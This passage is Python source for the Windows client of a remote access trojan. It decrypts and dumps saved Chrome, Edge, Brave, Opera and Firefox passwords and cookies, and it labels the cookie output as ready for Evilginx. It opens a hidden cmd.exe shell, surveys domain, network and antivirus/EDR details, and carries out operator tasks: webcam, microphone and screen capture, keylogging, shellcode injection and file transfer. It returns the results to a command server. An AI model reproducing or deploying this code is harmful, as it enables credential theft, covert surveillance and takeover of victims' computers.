                        raise Exception("Blob too short")

                    prefix = encrypted_password[:3]
                    if prefix in (b'v10', b'v11'):
                        nonce = encrypted_password[3:15]
                        ciphertext = encrypted_password[15:-16]
                        tag = encrypted_password[-16:]
                        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
                        password = plaintext.decode('utf-8', errors='replace')
                    else:
                        # Legacy DPAPI
                        plaintext = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                        password = plaintext.decode('utf-8', errors='replace')

                    if username or password.strip():
                        results.append(f"{url} | {username} | {password}")
                    # else: skip completely empty creds

                except Exception as dec_err:
                    # Improved debug info
                    results.append(f"{url} | {username} | [DECRYPT FAILED: {str(dec_err)[:50]} | prefix={encrypted_password[:3] if len(encrypted_password) >= 3 else 'N/A'} | len={len(encrypted_password)}]")

            conn.close()
            os.remove(temp_db)

        except Exception as e:
            results.append(f"[{browser_name}] Error: {str(e)}")

    if not results:
        return "No saved passwords found in Chromium browsers."

    header = "BROWSER_PASSWORDS_DUMPED:\n"
    header += f"{'URL':<60} {'USERNAME':<30} {'PASSWORD'}\n"
    header += "-" * 120 + "\n"
    body = "\n".join(results[:200])  # Limit to 200 entries to avoid huge beacons
    footer = f"\n\nTotal credentials extracted: {len(results)}"
    if len(results) > 200:
        footer += " (showing first 200)"

    return header + body + footer


# ===================== FIREFOX STEALER =====================
def find_firefox_profiles():
    """Finds Firefox profile directories."""
    profiles_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
    if not os.path.exists(profiles_path):
        return []

    profile_dirs = []
    for item in os.listdir(profiles_path):
        full_path = os.path.join(profiles_path, item)
        if os.path.isdir(full_path) and "logins.json" in os.listdir(full_path):
            profile_dirs.append(full_path)
    return profile_dirs

def dump_firefox_passwords():
    """Dumps saved passwords from Firefox profiles."""
    results = []
    profiles = find_firefox_profiles()

    if not profiles:
        return "No Firefox profiles found."

    for profile in profiles:
        logins_path = os.path.join(profile, "logins.json")
        try:
            with open(logins_path, "r", encoding="utf-8") as f:
                data = json.load(f)

            for login in data.get("logins", []):
                url = login.get("hostname", "N/A")
                # Note: These are not truly encrypted by default, just b64 encoded
                username = base64.b64decode(login.get("encryptedUsername", "")).decode(errors='ignore')
                password = base64.b64decode(login.get("encryptedPassword", "")).decode(errors='ignore')
                if username or password:
                    results.append(f"{url} | {username} | {password}")
        except Exception as e:
            results.append(f"[Profile: {os.path.basename(profile)}] Error: {str(e)}")

    if not results:
        return "No passwords found in Firefox profiles."

    header = "FIREFOX_PASSWORDS_DUMPED:\n"
    header += f"{'URL':<60} {'USERNAME':<30} {'PASSWORD'}\n"
    header += "-" * 120 + "\n"
    return header + "\n".join(results)

def steal_firefox_cookies():
    """Steals cookies from Firefox profiles."""
    results = []
    cookie_count = 0
    profiles = find_firefox_profiles()

    if not profiles:
        return "No Firefox profiles found to steal cookies from."

    for profile in profiles:
        cookies_db = os.path.join(profile, "cookies.sqlite")
        if not os.path.exists(cookies_db):
            continue

        try:
            temp_db = os.path.join(tempfile.gettempdir(), f"cookies_{uuid.uuid4().hex}.sqlite")
            shutil.copy2(cookies_db, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host, path, isSecure, expiry, name, value FROM moz_cookies")

            for row in cursor.fetchall():
                host, path, secure, expiry, name, value = row
                line = (
                    f"{host}\t"
                    f"{'TRUE' if host.startswith('.') else 'FALSE'}\t"
                    f"{path}\t"
                    f"{'TRUE' if secure else 'FALSE'}\t"
                    f"{expiry}\t"
                    f"{name}\t"
                    f"{value}"
                )
                results.append(line)
                cookie_count += 1

            conn.close()
            os.remove(temp_db)
        except Exception as e:
            results.append(f"# Error reading cookies from {os.path.basename(profile)}: {str(e)}")

    if not results:
        return "No cookies found in Firefox profiles."

    header = [
        "# FIREFOX COOKIE STEALER RESULTS",
        f"# Total cookies extracted: {cookie_count}",
        "# Netscape HTTP Cookie File Format",
        "#"
    ]
    return "\n".join(header + results)


# ===================== COOKIE STEALER =====================

def steal_browser_cookies():
    """
    Steals all cookies from Chromium-based browsers.
    Returns Netscape-format cookie string + summary.
    """
    results = []
    cookie_count = 0

    # Common browser base paths
    base_paths = [
        (os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data", "Chrome"),
        (os.getenv("LOCALAPPDATA") + r"\Microsoft\Edge\User Data", "Edge"),
        (os.getenv("LOCALAPPDATA") + r"\BraveSoftware\Brave-Browser\User Data", "Brave"),
        (os.getenv("LOCALAPPDATA") + r"\Opera Software\Opera Stable", "Opera"),
    ]

    master_key = None

    for base_path, browser_name in base_paths:
        if not os.path.exists(base_path):
            continue

        # Get Local State for master key (shared across profiles)
        local_state = os.path.join(base_path, "Local State")
        if os.path.exists(local_state) and master_key is None:
            try:
                with open(local_state, "r", encoding="utf-8") as f:
                    ls = json.loads(f.read())
                encrypted_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])
                encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
                master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            except:
                continue

        if not master_key:
            continue

        # Find all profile directories
        profile_paths = glob.glob(os.path.join(base_path, "Default")) + \
                        glob.glob(os.path.join(base_path, "Profile *"))

        for profile_path in profile_paths:
            cookies_db = os.path.join(profile_path, "Network", "Cookies")
            if not os.path.exists(cookies_db):
                continue

            try:
                temp_db = os.path.join(tempfile.gettempdir(), f"Cookies_{uuid.uuid4().hex}")
                shutil.copy2(cookies_db, temp_db)

                conn = sqlite3.connect(temp_db)
                conn.text_factory = bytes  # Important: cookies are binary
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, encrypted_value
                    FROM cookies
                    WHERE encrypted_value != ''
                """)

                for row in cursor.fetchall():
                    host = row[0].decode() if isinstance(row[0], bytes) else row[0]
                    name = row[1].decode() if isinstance(row[1], bytes) else row[1]
                    value = row[2]
                    path = row[3].decode() if isinstance(row[3], bytes) else row[3]
                    expires = row[4]
                    secure = row[5] == 1
                    httponly = row[6] == 1
                    encrypted_value = row[7]

                    if not encrypted_value:
                        continue

                    try:
                        # Decrypt (v10/v11 format)
                        nonce = encrypted_value[3:15]
                        ciphertext = encrypted_value[15:-16]
                        tag = encrypted_value[-16:]
                        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                        cookie_value = decrypted.decode('utf-8')
                    except:
                        cookie_value = "[DECRYPT FAILED]"

                    # Netscape format line
                    line = (
                        f"{host}\t"
                        f"{'TRUE' if '.'.join(host.split('.')[1:]) else 'FALSE'}\t"  # domain flag
                        f"{path}\t"
                        f"{'TRUE' if secure else 'FALSE'}\t"
                        f"{expires}\t"  # expires (Unix timestamp in microseconds → Chrome uses WebKit format, but tools accept it)
                        f"{name}\t"
                        f"{cookie_value}"
                    )
                    results.append(line)
                    cookie_count += 1

                conn.close()
                os.remove(temp_db)

            except Exception as e:
                results.append(f"# Error reading cookies from {profile_path}: {str(e)}")

    if not results:
        return "No cookies found or decryption failed."

    header = [
        "# COOKIE STEALER RESULTS",
        f"# Browser(s): {', '.join(set(name for _, name in base_paths if name))}",
        f"# Total cookies extracted: {cookie_count}",
        "# Netscape HTTP Cookie File Format (ready for curl -b, Evilginx, etc.)",
        "#",
    ]

    return "\n".join(header + results)

def start_interactive_shell():
    global shell_process
    if shell_process is not None:
        return "Already running"

    # Start hidden cmd.exe (no window)
    CREATE_NO_WINDOW = 0x08000000
    shell_process = subprocess.Popen(
        ["cmd.exe"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        universal_newlines=True,
        creationflags=CREATE_NO_WINDOW
    )

    def reader():
        while True:
            line = shell_process.stdout.readline()
            if not line and shell_process.poll() is not None:
                break
            if line:
                shell_output_queue.put(line.rstrip("\n"))

    threading.Thread(target=reader, daemon=True).start()
    return "Interactive shell started"

def stop_interactive_shell():
    global shell_process
    if shell_process is None:
        return "Not running"
    try:
        shell_process.terminate()
        shell_process.wait(timeout=3)
    except:
        shell_process.kill()
    shell_process = None
    # Clear any leftover output
    while not shell_output_queue.empty():
        try:
            shell_output_queue.get_nowait()
        except:
            pass
    return "Interactive shell terminated"



# --- ARP Table Structures ---
class MIB_IPNETROW(ctypes.Structure):
    _fields_ = [
        ("dwIndex", wt.DWORD),
        ("dwPhysAddrLen", wt.DWORD),
        ("bPhysAddr", ctypes.c_byte * 8),
        ("dwAddr", wt.DWORD),
        ("dwType", wt.DWORD),
    ]

def decode_ip(addr):
    return ".".join(map(str, addr.to_bytes(4, "little")))

def decode_product_state(state):
    """Decodes the productState bitmask from WMI's AntiVirusProduct class."""
    state_str = str(state)
    if len(state_str) < 6:
        return "Unknown State"

    byte_2 = int(state_str[2:4])
    byte_4 = int(state_str[4:6])

    # Real-time protection status (byte 2)
    rtp_status = "Enabled" if (byte_2 & 0b00010000) == 0b00010000 else "Disabled"

    # Definition status (byte 4)
    def_status = "Up to date" if (byte_4 & 0b00000000) == 0 else "Out of date"

    return f"RTP: {rtp_status}, Definitions: {def_status}"

def get_deep_recon():
    recon_data = {
        "domain_info": {},
        "arp_table": [],
        "security_products": []
    }

    pythoncom.CoInitialize()
    try:
        c = wmi.WMI()
        os_info = c.Win32_OperatingSystem()[0]
        is_server = 'server' in os_info.Caption.lower()

        for sys in c.Win32_ComputerSystem():
            role_map = {0: "Standalone Workstation", 1: "Member Workstation", 2: "Standalone Server", 3: "Member Server", 4: "Backup Domain Controller", 5: "Primary Domain Controller"}
            recon_data["domain_info"] = {"DNSHostName": sys.DNSHostName, "Domain": sys.Domain, "PartOfDomain": sys.PartOfDomain, "DomainRole": role_map.get(sys.DomainRole, "Unknown"), "Workgroup": sys.Workgroup}

        if is_server:
            recon_data["security_products"] = "N/A (Windows Server)"
            edr_processes = [p.Name for p in c.Win32_Process() if p.Name.lower() in ["mssense.exe", "csagent.exe", "carbonblack.exe"]]
            if edr_processes:
                recon_data["security_products"] += f" - Detected EDR processes: {', '.join(edr_processes)}"
        else:
            try:
                sc = wmi.WMI(namespace="root\\SecurityCenter2")
                for av in sc.AntiVirusProduct():
                    recon_data["security_products"].append({"name": av.displayName, "state": decode_product_state(av.productState), "exe": av.pathToSignedProductExe})
            except Exception:
                recon_data["security_products"] = "N/A (WMI Namespace Error)"

        iphlpapi = ctypes.WinDLL('iphlpapi')
        size = wt.DWORD(0)
        iphlpapi.GetIpNetTable(None, ctypes.byref(size), True)
        if size.value > 0:
            buffer = ctypes.create_string_buffer(size.value)
            if iphlpapi.GetIpNetTable(buffer, ctypes.byref(size), True) == 0:
                num_entries = ctypes.cast(buffer, ctypes.POINTER(wt.DWORD)).contents.value
                row_ptr = ctypes.cast(ctypes.addressof(buffer) + 4, ctypes.POINTER(MIB_IPNETROW))
                for i in range(num_entries):
                    row = row_ptr[i]
                    if row.dwType != 2:
                        mac = "-".join(f"{b & 0xFF:02x}" for b in row.bPhysAddr[:row.dwPhysAddrLen])
                        recon_data["arp_table"].append({"ip": decode_ip(row.dwAddr), "mac": mac, "type": "Dynamic" if row.dwType == 3 else "Static"})
    except Exception as e:
        recon_data["error"] = str(e)
    finally:
        pythoncom.CoUninitialize()

    json_output = json.dumps(recon_data, indent=4)
    if len(json_output) > 1024:
        return zlib.compress(json_output.encode())
    return json_output

def handle_task(task):
    tid = task["task_id"]
    ttype = task["type"]
    cmd = task.get("cmd", "")
    result = {"task_id": tid, "output": "", "error": ""}

    try:
        if ttype == "screenshot":
            try:
                data = capture_screenshot()  # Returns JPEG bytes
                b64 = base64.b64encode(data).decode()
                result["output"] = f"SCREENSHOT:{b64}"
                # No chunking needed — modern screenshots are <1MB and fit easily in one beacon
            except Exception as e:
                result["error"] = f"Screenshot failed: {str(e)}"


        elif ttype == "webcam":
            data = capture_webcam()
            result["output"] = "WEBCAM:" + base64.b64encode(data).decode()

        elif ttype == "mic":
            secs = int(cmd) if cmd.isdigit() else 10
            data = record_mic(secs)
            return chunk_large_output("AUDIO:", data)
        elif ttype == "shell":
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            result["output"] = out.decode(errors="ignore")

        elif ttype == "file_download":
            with open(cmd, "rb") as f:
                data = f.read()
            chunks = chunk_large_output(f"FILE_DOWNLOAD:{os.path.basename(cmd)}:", data)
            for chunk in chunks:
                with results_lock:
                    pending_results.append({"task_id": tid + f"_part{chunks.index(chunk)}", "output": chunk})

        elif ttype == "file_upload":
            path, b64 = cmd.split(":", 1)
            with open(path, "wb") as f:
                f.write(base64.b64decode(b64))
            result["output"] = f"Uploaded {path}"

        elif ttype == "wifi_dump":
            output = dump_wifi_profiles()
            result["output"] = "WIFI_DUMP:" + output

        elif ttype == "cookie_steal":
            output = steal_browser_cookies()
            result["output"] = "COOKIES:" + output

        elif ttype == "browser_pass":
            output = dump_browser_passwords()
            result["output"] = "BROWSER_PASS:" + output

        elif ttype =="installed_apps":
            try:
                apps_list = enum_installed_software()
                # CRITICAL: Serialize properly to compact JSON
                apps_json = json.dumps(apps_list, separators=(',', ':'))
                result["output"] = "APPS_ENUM:" + apps_json
                result["task_id"] = tid  # Ensure original task_id preserved
            except Exception as e:
                result["error"] = f"Failed to enumerate apps: {str(e)}"

        elif ttype == "webcam_stream":
            parts = cmd.split()
            action = parts[0].lower()
            duration = 0
            if len(parts) > 1:
                try:
                    duration = int(parts[1])
                except:
                    duration = 0

            if action == "start":
                msg = start_webcam_stream(duration)
                result["output"] = f"SWEBCAM_STREAM_STATUS:{msg}"
            elif action == "stop":
                msg = stop_webcam_stream()
                result["output"] = f"SWEBCAM_STREAM_STATUS:{msg}"

        elif ttype == "screen_stream":
            parts = cmd.split()
            action = parts[0].lower()
            duration = 0
            if len(parts) > 1:
                try:
                    duration = int(parts[1])
                except:
                    duration = 0

            if action == "start":
                msg = start_screen_stream(duration)
                result["output"] = f"SCREEN_STREAM_STATUS:{msg}"
            elif action == "stop":
                msg = stop_screen_stream()
                result["output"] = f"SCREEN_STREAM_STATUS:{msg}"

        elif ttype == "ishell":
            cmd = task.get("cmd", "").strip()

            if cmd.lower() == "start":
                msg = start_interactive_shell()
                result["output"] = f"ISHELL_STATUS:{msg}"

            elif cmd.lower() == "exit":
                msg = stop_interactive_shell()
                result["output"] = f"ISHELL_STATUS:{msg}"

            else:
                # Normal command input
                if shell_process is None:
                    result["error"] = "Shell not started"
                else:
                    shell_process.stdin.write(cmd + "\n")
                    shell_process.stdin.flush()

                    # Grab all currently available output
                    output_lines = []
                    time.sleep(0.15)  # give cmd.exe a moment to produce output
                    while not shell_output_queue.empty():
                        try:
                            output_lines.append(shell_output_queue.get_nowait())
                        except:
                            break
                    if output_lines:
                        result["output"] = "ISHELL_OUTPUT:\n" + "\n".join(output_lines)
                    else:
                        result["output"] = "ISHELL_OUTPUT:"  # empty marker so server knows we processed it


        elif ttype == "keylog":
            if cmd == "start":
                start_keylogger()
                result["output"] = "Keylogger started"
            elif cmd == "stop":
                stop_keylogger()
                result["output"] = "Keylogger stopped"
        elif ttype == "inject":
            parts = cmd.split(" ")
            pid = int(parts[0])
            sc = base64.b64decode(parts[1])
            result["output"] = inject_shellcode(pid, sc)
        # Add more as needed (sysinfo, etc.)
        elif ttype == "sysinfo":
            result["output"] = "sysinfo:" + get_sysinfo()
        elif ttype == "deep_recon":
            result["output"] = get_deep_recon()

        elif ttype == "browse_fs":
            path = cmd if cmd else "."
            try:
                items = []
                for item in os.listdir(path):
                    full_path = os.path.join(path, item)
                    stat = os.stat(full_path)
                    items.append({
                        "name": item,
                        "type": "dir" if os.path.isdir(full_path) else "file",
                        "size": stat.st_size,
                        "modified": datetime.fromtimestamp(stat.st_mtime).isoformat()
                    })
                result["output"] = "FS_LIST:" + json.dumps(items)
            except Exception as e:
                result["error"] = f"Failed to browse '{path}': {str(e)}"

    except Exception as e:
        result["error"] = str(e)

    with results_lock:
        pending_results.append(result)

if __name__ == "__main__":
    import sys
    main()